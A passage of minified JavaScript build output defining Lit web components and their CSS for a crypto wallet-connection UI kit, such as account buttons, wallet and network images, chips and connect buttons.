    gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-3xs) var(--wui-spacing-xs) var(--wui-spacing-3xs)
      var(--wui-spacing-xs);
    border: 1px solid var(--wui-gray-glass-005);
  }

  button:disabled {
    background: var(--wui-gray-glass-015);
  }

  button:disabled > wui-text {
    color: var(--wui-gray-glass-015);
  }

  button:disabled > wui-flex > wui-text {
    color: var(--wui-gray-glass-015);
  }

  button:disabled > wui-image,
  button:disabled > wui-icon-box,
  button:disabled > wui-flex > wui-avatar {
    filter: grayscale(1);
  }

  button:has(wui-image) {
    padding: var(--wui-spacing-3xs) var(--wui-spacing-3xs) var(--wui-spacing-3xs)
      var(--wui-spacing-xs);
  }

  wui-text {
    color: var(--wui-color-fg-100);
  }

  wui-flex > wui-text {
    color: var(--wui-color-fg-200);
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
  }

  wui-image,
  wui-icon-box {
    border-radius: var(--wui-border-radius-3xl);
    width: 24px;
    height: 24px;
    box-shadow: 0 0 0 2px var(--wui-gray-glass-005);
  }

  wui-flex {
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-gray-glass-005);
    background: var(--wui-gray-glass-005);
    padding: 4px var(--wui-spacing-m) 4px var(--wui-spacing-xxs);
  }

  button.local-no-balance {
    border-radius: 0px;
    border: none;
    background: transparent;
  }

  wui-avatar {
    width: 20px;
    height: 20px;
    box-shadow: 0 0 0 2px var(--wui-accent-glass-010);
  }

  @media (max-width: 500px) {
    button {
      gap: 0px;
      padding: var(--wui-spacing-3xs) var(--wui-spacing-xs) !important;
      height: 32px;
    }
    wui-image,
    wui-icon-box,
    button > wui-text {
      visibility: hidden;
      width: 0px;
      height: 0px;
    }
    button {
      border-radius: 0px;
      border: none;
      background: transparent;
      padding: 0px;
    }
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled > wui-flex > wui-text {
      color: var(--wui-color-fg-175);
    }

    button:active:enabled > wui-flex > wui-text {
      color: var(--wui-color-fg-175);
    }
  }
`;var Kn=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Gt=class extends H{constructor(){super(...arguments),this.networkSrc=void 0,this.avatarSrc=void 0,this.balance=void 0,this.disabled=!1,this.isProfileName=!1,this.address="",this.charsStart=4,this.charsEnd=6}render(){return $`
      <button
        ?disabled=${this.disabled}
        class=${ve(this.balance?void 0:"local-no-balance")}
      >
        ${this.balanceTemplate()}
        <wui-flex gap="xxs" alignItems="center">
          <wui-avatar
            .imageSrc=${this.avatarSrc}
            alt=${this.address}
            address=${this.address}
          ></wui-avatar>
          <wui-text variant="paragraph-600" color="inherit">
            ${Be.getTruncateString({string:this.address,charsStart:this.isProfileName?18:this.charsStart,charsEnd:this.isProfileName?0:this.charsEnd,truncate:this.isProfileName?"end":"middle"})}
          </wui-text>
        </wui-flex>
      </button>
    `}balanceTemplate(){if(this.balance){const e=this.networkSrc?$`<wui-image src=${this.networkSrc}></wui-image>`:$`
            <wui-icon-box
              size="sm"
              iconColor="fg-200"
              backgroundColor="fg-300"
              icon="networkPlaceholder"
            ></wui-icon-box>
          `;return $`
        ${e}
        <wui-text variant="paragraph-600" color="inherit"> ${this.balance} </wui-text>
      `}return null}};Gt.styles=[pe,Ye,j3];Kn([O()],Gt.prototype,"networkSrc",void 0);Kn([O()],Gt.prototype,"avatarSrc",void 0);Kn([O()],Gt.prototype,"balance",void 0);Kn([O({type:Boolean})],Gt.prototype,"disabled",void 0);Kn([O({type:Boolean})],Gt.prototype,"isProfileName",void 0);Kn([O()],Gt.prototype,"address",void 0);Kn([O()],Gt.prototype,"charsStart",void 0);Kn([O()],Gt.prototype,"charsEnd",void 0);Gt=Kn([z("wui-account-button")],Gt);const F3=q`
  :host {
    position: relative;
    background-color: var(--wui-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-size);
    height: var(--local-size);
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host > wui-flex {
    overflow: hidden;
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-gray-glass-010);
    pointer-events: none;
  }

  :host([name='Extension'])::after {
    border: 1px solid var(--wui-accent-glass-010);
  }

  :host([data-wallet-icon='allWallets']) {
    background-color: var(--wui-all-wallets-bg-100);
  }

  :host([data-wallet-icon='allWallets'])::after {
    border: 1px solid var(--wui-accent-glass-010);
  }

  wui-icon[data-parent-size='inherit'] {
    width: 75%;
    height: 75%;
    align-items: center;
  }

  wui-icon[data-parent-size='sm'] {
    width: 18px;
    height: 18px;
  }

  wui-icon[data-parent-size='md'] {
    width: 24px;
    height: 24px;
  }

  wui-icon[data-parent-size='lg'] {
    width: 42px;
    height: 42px;
  }

  wui-icon[data-parent-size='full'] {
    width: 100%;
    height: 100%;
  }

  :host > wui-icon-box {
    position: absolute;
    overflow: hidden;
    right: -1px;
    bottom: -2px;
    z-index: 1;
    border: 2px solid var(--wui-color-bg-base-150, #1e1f1f);
    padding: 1px;
  }
`;var di=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let En=class extends H{constructor(){super(...arguments),this.size="md",this.name="",this.installed=!1,this.badgeSize="xs"}render(){let e="xxs";return this.size==="lg"?e="m":this.size==="md"?e="xs":e="xxs",this.style.cssText=`
       --local-border-radius: var(--wui-border-radius-${e});
       --local-size: var(--wui-wallet-image-size-${this.size});
   `,this.walletIcon&&(this.dataset.walletIcon=this.walletIcon),$`
      <wui-flex justifyContent="center" alignItems="center"> ${this.templateVisual()} </wui-flex>
    `}templateVisual(){return this.imageSrc?$`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:this.walletIcon?$`<wui-icon
        data-parent-size="md"
        size="md"
        color="inherit"
        name=${this.walletIcon}
      ></wui-icon>`:$`<wui-icon
      data-parent-size=${this.size}
      size="inherit"
      color="inherit"
      name="walletPlaceholder"
    ></wui-icon>`}};En.styles=[pe,F3];di([O()],En.prototype,"size",void 0);di([O()],En.prototype,"name",void 0);di([O()],En.prototype,"imageSrc",void 0);di([O()],En.prototype,"walletIcon",void 0);di([O({type:Boolean})],En.prototype,"installed",void 0);di([O()],En.prototype,"badgeSize",void 0);En=di([z("wui-wallet-image")],En);const W3=q`
  :host {
    position: relative;
    border-radius: var(--wui-border-radius-xxs);
    width: 40px;
    height: 40px;
    overflow: hidden;
    background: var(--wui-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    gap: var(--wui-spacing-4xs);
    padding: 3.75px !important;
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-gray-glass-010);
    pointer-events: none;
  }

  :host > wui-wallet-image {
    width: 14px;
    height: 14px;
    border-radius: var(--wui-border-radius-5xs);
  }

  :host > wui-flex {
    padding: 2px;
    position: fixed;
    overflow: hidden;
    left: 34px;
    bottom: 8px;
    background: var(--dark-background-150, #1e1f1f);
    border-radius: 50%;
    z-index: 2;
    display: flex;
  }
`;var Rp=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const Sl=4;let oa=class extends H{constructor(){super(...arguments),this.walletImages=[]}render(){const e=this.walletImages.length<Sl;return $`${this.walletImages.slice(0,Sl).map(({src:n,walletName:r})=>$`
            <wui-wallet-image
              size="inherit"
              imageSrc=${n}
              name=${ve(r)}
            ></wui-wallet-image>
          `)}
      ${e?[...Array(Sl-this.walletImages.length)].map(()=>$` <wui-wallet-image size="inherit" name=""></wui-wallet-image>`):null}
      <wui-flex>
        <wui-icon-box
          size="xxs"
          iconSize="xxs"
          iconcolor="success-100"
          backgroundcolor="success-100"
          icon="checkmark"
          background="opaque"
        ></wui-icon-box>
      </wui-flex>`}};oa.styles=[pe,W3];Rp([O({type:Array})],oa.prototype,"walletImages",void 0);oa=Rp([z("wui-all-wallets-image")],oa);const z3=q`
  :host {
    width: var(--local-width);
    position: relative;
  }

  button {
    border: 1px solid var(--wui-gray-glass-010);
    border-radius: var(--wui-border-radius-m);
    width: var(--local-width);
  }

  button:disabled {
    border: 1px solid var(--wui-gray-glass-010);
  }

  button[data-size='sm'] {
    padding: var(--wui-spacing-xxs) var(--wui-spacing-s);
  }

  button[data-size='sm'][data-icon-left='true'] {
    padding: var(--wui-spacing-xxs) var(--wui-spacing-s) var(--wui-spacing-xxs)
      var(--wui-spacing-xs);
  }

  button[data-size='sm'][data-icon-right='true'] {
    padding: var(--wui-spacing-xxs) var(--wui-spacing-xs) var(--wui-spacing-xxs)
      var(--wui-spacing-s);
  }

  ::slotted(*) {
    transition: opacity 200ms ease-in-out;
    opacity: var(--local-opacity-100);
  }

  button > wui-text {
    transition: opacity 200ms ease-in-out;
    opacity: var(--local-opacity-100);
  }

  button[data-size='md'] {
    padding: 8.2px var(--wui-spacing-l) 9px var(--wui-spacing-l);
  }

  button[data-size='md'][data-icon-left='true'] {
    padding: 8.2px var(--wui-spacing-l) 9px var(--wui-spacing-s);
  }

  button[data-size='md'][data-icon-right='true'] {
    padding: 8.2px var(--wui-spacing-s) 9px var(--wui-spacing-l);
  }

  wui-loading-spinner {
    position: absolute;
    left: 50%;
    top: 50%;
    transition: all 200ms ease-in-out;
    transform: translate(-50%, -50%);
    opacity: var(--local-opacity-000);
  }
`;var _r=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let sn=class extends H{constructor(){super(...arguments),this.size="md",this.disabled=!1,this.fullWidth=!1,this.loading=!1,this.variant="fill",this.hasIconLeft=!1,this.hasIconRight=!1}render(){this.style.cssText=`
    --local-width: ${this.fullWidth?"100%":"auto"};
    --local-opacity-100: ${this.loading?0:1};
    --local-opacity-000: ${this.loading?1:0};`;const e=this.size==="md"?"paragraph-600":"small-600";return $`
      <button
        data-variant=${this.variant}
        data-icon-left=${this.hasIconLeft}
        data-icon-right=${this.hasIconRight}
        data-size=${this.size}
        ?disabled=${this.disabled||this.loading}
        ontouchstart
      >
        ${this.loadingTemplate()}
        <slot name="iconLeft" @slotchange=${()=>this.handleSlotLeftChange()}></slot>
        <wui-text variant=${e} color="inherit">
          <slot></slot>
        </wui-text>
        <slot name="iconRight" @slotchange=${()=>this.handleSlotRightChange()}></slot>
      </button>
    `}handleSlotLeftChange(){this.hasIconLeft=!0}handleSlotRightChange(){this.hasIconRight=!0}loadingTemplate(){return this.loading?$`<wui-loading-spinner color="fg-300"></wui-loading-spinner>`:$``}};sn.styles=[pe,Ye,z3];_r([O()],sn.prototype,"size",void 0);_r([O({type:Boolean})],sn.prototype,"disabled",void 0);_r([O({type:Boolean})],sn.prototype,"fullWidth",void 0);_r([O({type:Boolean})],sn.prototype,"loading",void 0);_r([O()],sn.prototype,"variant",void 0);_r([O({type:Boolean})],sn.prototype,"hasIconLeft",void 0);_r([O({type:Boolean})],sn.prototype,"hasIconRight",void 0);sn=_r([z("wui-button")],sn);const Np=K`<svg  viewBox="0 0 48 54" fill="none">
  <path
    d="M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z"
  />
</svg>`,H3=q`
  :host {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 76px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xs) 10px;
    background-color: var(--wui-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
    position: relative;
  }

  wui-shimmer[data-type='network'] {
    border: none;
    -webkit-clip-path: var(--wui-path-network);
    clip-path: var(--wui-path-network);
  }

  svg {
    position: absolute;
    width: 48px;
    height: 54px;
    z-index: 1;
  }

  svg > path {
    stroke: var(--wui-gray-glass-010);
    stroke-width: 1px;
  }
`;var kp=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let aa=class extends H{constructor(){super(...arguments),this.type="wallet"}render(){return $`
      ${this.shimmerTemplate()}
      <wui-shimmer width="56px" height="20px" borderRadius="xs"></wui-shimmer>
    `}shimmerTemplate(){return this.type==="network"?$` <wui-shimmer
          data-type=${this.type}
          width="48px"
          height="54px"
          borderRadius="xs"
        ></wui-shimmer>
        ${Np}`:$`<wui-shimmer width="56px" height="56px" borderRadius="xs"></wui-shimmer>`}};aa.styles=[pe,Ye,H3];kp([O()],aa.prototype,"type",void 0);aa=kp([z("wui-card-select-loader")],aa);const V3=K`<svg width="86" height="96" fill="none">
  <path
    d="M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z"
  />
</svg>`,Z3=q`
  :host {
    position: relative;
    border-radius: inherit;
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-width);
    height: var(--local-height);
  }

  svg {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    fill: var(--wui-gray-glass-002);
  }

  svg > path {
    stroke: var(--local-stroke);
    transition: stroke var(--wui-ease-out-power-1) var(--wui-duration-lg);
  }

  wui-image {
    width: 100%;
    height: 100%;
    -webkit-clip-path: var(--local-path);
    clip-path: var(--local-path);
    background: var(--wui-gray-glass-002);
  }

  wui-icon {
    transform: translateY(-5%);
    width: var(--local-icon-size);
    height: var(--local-icon-size);
  }
`;var Wa=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let hr=class extends H{constructor(){super(...arguments),this.size="md",this.name="uknown",this.selected=!1}render(){const e=this.size==="lg";return this.style.cssText=`
      --local-stroke: ${this.selected?"var(--wui-color-accent-100)":"var(--wui-gray-glass-010)"};
      --local-path: ${e?"var(--wui-path-network-lg)":"var(--wui-path-network)"};
      --local-width: ${e?"86px":"48px"};
      --local-height: ${e?"96px":"54px"};
      --local-icon-size: ${e?"42px":"24px"};
    `,$`${this.templateVisual()} ${e?V3:Np}`}templateVisual(){return this.imageSrc?$`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:$`<wui-icon size="inherit" color="fg-200" name="networkPlaceholder"></wui-icon>`}};hr.styles=[pe,Z3];Wa([O()],hr.prototype,"size",void 0);Wa([O()],hr.prototype,"name",void 0);Wa([O()],hr.prototype,"imageSrc",void 0);Wa([O({type:Boolean})],hr.prototype,"selected",void 0);hr=Wa([z("wui-network-image")],hr);const G3=q`
  button {
    flex-direction: column;
    width: 76px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xs) var(--wui-spacing-0);
    background-color: var(--wui-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
  }

  button > wui-text {
    color: var(--wui-color-fg-100);
    max-width: var(--wui-icon-box-size-xl);
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    justify-content: center;
  }

  button:disabled > wui-text {
    color: var(--wui-gray-glass-015);
  }

  [data-selected='true'] {
    background-color: var(--wui-accent-glass-020);
  }

  @media (hover: hover) and (pointer: fine) {
    [data-selected='true']:hover:enabled {
      background-color: var(--wui-accent-glass-015);
    }
  }

  [data-selected='true']:active:enabled {
    background-color: var(--wui-accent-glass-010);
  }
`;var fi=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Cn=class extends H{constructor(){super(...arguments),this.name="Unknown",this.type="wallet",this.imageSrc=void 0,this.disabled=!1,this.selected=!1,this.installed=!1}render(){return $`
      <button data-selected=${ve(this.selected)} ?disabled=${this.disabled} ontouchstart>
        ${this.imageTemplate()}
        <wui-text variant="tiny-500" color=${this.selected?"accent-100":"inherit"}>
          ${this.name}
        </wui-text>
      </button>
    `}imageTemplate(){return this.type==="network"?$`
        <wui-network-image
          .selected=${this.selected}
          imageSrc=${ve(this.imageSrc)}
          name=${this.name}
        >
        </wui-network-image>
      `:$`
      <wui-wallet-image
        size="md"
        imageSrc=${ve(this.imageSrc)}
        name=${this.name}
        .installed=${this.installed}
        badgeSize="sm"
      >
      </wui-wallet-image>
    `}};Cn.styles=[pe,Ye,G3];fi([O()],Cn.prototype,"name",void 0);fi([O()],Cn.prototype,"type",void 0);fi([O()],Cn.prototype,"imageSrc",void 0);fi([O({type:Boolean})],Cn.prototype,"disabled",void 0);fi([O({type:Boolean})],Cn.prototype,"selected",void 0);fi([O({type:Boolean})],Cn.prototype,"installed",void 0);Cn=fi([z("wui-card-select")],Cn);const q3=q`
  a {
    border: 1px solid var(--wui-gray-glass-010);
    border-radius: var(--wui-border-radius-3xl);
  }

  wui-image {
    border-radius: var(--wui-border-radius-3xl);
    overflow: hidden;
  }

  a.disabled > wui-icon,
  a.disabled > wui-image {
    filter: grayscale(1);
  }

  a[data-variant='fill'] {
    color: var(--wui-color-inverse-100);
    background-color: var(--wui-color-accent-100);
  }

  a[data-variant='shade'],
  a[data-variant='shadeSmall'] {
    background-color: transparent;
    background-color: var(--wui-gray-glass-010);
    color: var(--wui-color-fg-200);
  }

  a[data-variant='success'] {
    column-gap: var(--wui-spacing-xxs);
    border: 1px solid var(--wui-success-glass-010);
    background-color: var(--wui-success-glass-010);
    color: var(--wui-color-success-100);
  }

  a[data-variant='transparent'] {
    column-gap: var(--wui-spacing-xxs);
    background-color: transparent;
    color: var(--wui-color-fg-150);
  }

  a[data-variant='transparent'],
  a[data-variant='success'],
  a[data-variant='shadeSmall'] {
    padding: 7px var(--wui-spacing-s) 7px 10px;
  }

  a[data-variant='transparent']:has(wui-text:first-child),
  a[data-variant='success']:has(wui-text:first-child),
  a[data-variant='shadeSmall']:has(wui-text:first-child) {
    padding: 7px var(--wui-spacing-s);
  }

  a[data-variant='fill'],
  a[data-variant='shade'] {
    column-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xxs) var(--wui-spacing-m) var(--wui-spacing-xxs)
      var(--wui-spacing-xs);
  }

  a[data-variant='fill']:has(wui-text:first-child),
  a[data-variant='shade']:has(wui-text:first-child) {
    padding: 9px var(--wui-spacing-m) 9px var(--wui-spacing-m);
  }

  a[data-variant='fill'] > wui-image,
  a[data-variant='shade'] > wui-image {
    width: 24px;
    height: 24px;
  }

  a[data-variant='fill'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-accent-090);
  }

  a[data-variant='shade'] > wui-image,
  a[data-variant='shadeSmall'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-gray-glass-010);
  }

  a[data-variant='fill'] > wui-icon,
  a[data-variant='shade'] > wui-icon {
    width: 14px;
    height: 14px;
  }

  a[data-variant='transparent'] > wui-image,
  a[data-variant='success'] > wui-image,
  a[data-variant='shadeSmall'] > wui-image {
    width: 14px;
    height: 14px;
  }

  a[data-variant='transparent'] > wui-icon,
  a[data-variant='success'] > wui-icon,
  a[data-variant='shadeSmall'] > wui-icon {
    width: 12px;
    height: 12px;
  }

  a[data-variant='fill']:focus-visible {
    background-color: var(--wui-color-accent-090);
  }

  a[data-variant='shade']:focus-visible,
  a[data-variant='shadeSmall']:focus-visible {
    background-color: var(--wui-gray-glass-015);
  }

  a[data-variant='transparent']:focus-visible {
    background-color: var(--wui-gray-glass-005);
  }

  a[data-variant='success']:focus-visible {
    background-color: var(--wui-success-glass-015);
  }

  a.disabled {
    color: var(--wui-gray-glass-015);
    background-color: var(--wui-gray-glass-015);
    pointer-events: none;
  }

  @media (hover: hover) and (pointer: fine) {
    a[data-variant='fill']:hover {
      background-color: var(--wui-color-accent-090);
    }

    a[data-variant='shade']:hover,
    a[data-variant='shadeSmall']:hover {
      background-color: var(--wui-gray-glass-015);
    }

    a[data-variant='transparent']:hover {
      background-color: var(--wui-gray-glass-005);
    }

    a[data-variant='success']:hover {
      background-color: var(--wui-success-glass-015);
    }
  }

  a[data-variant='fill']:active {
    background-color: var(--wui-color-accent-080);
  }

  a[data-variant='shade']:active,
  a[data-variant='shadeSmall']:active {
    background-color: var(--wui-gray-glass-020);
  }

  a[data-variant='transparent']:active {
    background-color: var(--wui-gray-glass-010);
  }

  a[data-variant='success']:active {
    background-color: var(--wui-success-glass-020);
  }
`;var hi=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Sn=class extends H{constructor(){super(...arguments),this.variant="fill",this.imageSrc=void 0,this.disabled=!1,this.icon="externalLink",this.href="",this.text=void 0}render(){const n=this.variant==="success"||this.variant==="transparent"||this.variant==="shadeSmall"?"small-600":"paragraph-600";return $`
      <a
        rel="noreferrer"
        target="_blank"
        href=${this.href}
        class=${this.disabled?"disabled":""}
        data-variant=${this.variant}
      >
        ${this.imageTemplate()}
        <wui-text variant=${n} color="inherit">
          ${this.title?this.title:Be.getHostName(this.href)}
        </wui-text>
        <wui-icon name=${this.icon} color="inherit" size="inherit"></wui-icon>
      </a>
    `}imageTemplate(){return this.imageSrc?$`<wui-image src=${this.imageSrc}></wui-image>`:null}};Sn.styles=[pe,Ye,q3];hi([O()],Sn.prototype,"variant",void 0);hi([O()],Sn.prototype,"imageSrc",void 0);hi([O({type:Boolean})],Sn.prototype,"disabled",void 0);hi([O()],Sn.prototype,"icon",void 0);hi([O()],Sn.prototype,"href",void 0);hi([O()],Sn.prototype,"text",void 0);Sn=hi([z("wui-chip")],Sn);const K3=q`
  :host {
    position: relative;
    display: block;
  }

  button {
    background: var(--wui-color-accent-100);
    border: 1px solid var(--wui-gray-glass-010);
    border-radius: var(--wui-border-radius-m);
    gap: var(--wui-spacing-xs);
  }

  button.loading {
    background: var(--wui-gray-glass-010);
    border: 1px solid var(--wui-gray-glass-010);
    pointer-events: none;
  }

  button:disabled {
    background-color: var(--wui-gray-glass-015);
    border: 1px solid var(--wui-gray-glass-010);
  }

  button:disabled > wui-text {
    color: var(--wui-gray-glass-015);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button:active:enabled {
      background-color: var(--wui-color-accent-080);
    }
  }

  button:focus-visible {
    border: 1px solid var(--wui-gray-glass-010);
    background-color: var(--wui-color-accent-090);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  button[data-size='sm'] {
    padding: 6.75px 10px 7.25px;
  }

  ::slotted(*) {
    transition: opacity 200ms ease-in-out;
    opacity: var(--local-opacity-100);
  }

  button > wui-text {
    transition: opacity 200ms ease-in-out;
    opacity: var(--local-opacity-100);
    color: var(--wui-color-inverse-100);
  }

  button[data-size='md'] {
    padding: 9px var(--wui-spacing-l) 9px var(--wui-spacing-l);
  }

  button[data-size='md'] + wui-text {
    padding-left: var(--wui-spacing-3xs);
  }

  @media (max-width: 500px) {
    button[data-size='md'] {
      height: 32px;
      padding: 5px 12px;
    }

    button[data-size='md'] > wui-text > slot {
      font-size: 14px !important;
    }
  }

  wui-loading-spinner {
    width: 14px;
    height: 14px;
  }

  wui-loading-spinner::slotted(svg) {
    width: 10px !important;
    height: 10px !important;
  }

  button[data-size='sm'] > wui-loading-spinner {
    width: 12px;
    height: 12px;
  }
`;var Ud=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ji=class extends H{constructor(){super(...arguments),this.size="md",this.loading=!1}render(){const e=this.size==="md"?"paragraph-600":"small-600";return $`
      <button data-size=${this.size} ?disabled=${this.loading} ontouchstart>
        ${this.loadingTemplate()}
        <wui-text variant=${e} color=${this.loading?"accent-100":"inherit"}>
          <slot></slot>
        </wui-text>
      </button>
    `}loadingTemplate(){return this.loading?$`<wui-loading-spinner size=${this.size} color="accent-100"></wui-loading-spinner>`:null}};ji.styles=[pe,Ye,K3];Ud([O()],ji.prototype,"size",void 0);Ud([O({type:Boolean})],ji.prototype,"loading",void 0);ji=Ud([z("wui-connect-button")],ji);const Y3=q`
  wui-flex {
    width: 100%;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }
`;var Mc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Xr=class extends H{constructor(){super(...arguments),this.disabled=!1,this.label="",this.buttonLabel=""}render(){return $`
      <wui-flex
        justifyContent="space-between"
        alignItems="center"
        .padding=${["1xs","2l","1xs","2l"]}
      >
        <wui-text variant="paragraph-500" color="fg-200">${this.label}</wui-text>
        <wui-button size="sm" variant="accent">
          ${this.buttonLabel}
          <wui-icon size="xs" color="inherit" slot="iconRight" name="chevronRight"></wui-icon>
        </wui-button>
      </wui-flex>
    `}};Xr.styles=[pe,Ye,Y3];Mc([O({type:Boolean})],Xr.prototype,"disabled",void 0);Mc([O()],Xr.prototype,"label",void 0);Mc([O()],Xr.prototype,"buttonLabel",void 0);Xr=Mc([z("wui-cta-button")],Xr);/**
 * @license
 * Copyright 2020 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const J3=t=>t.strings===void 0;/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
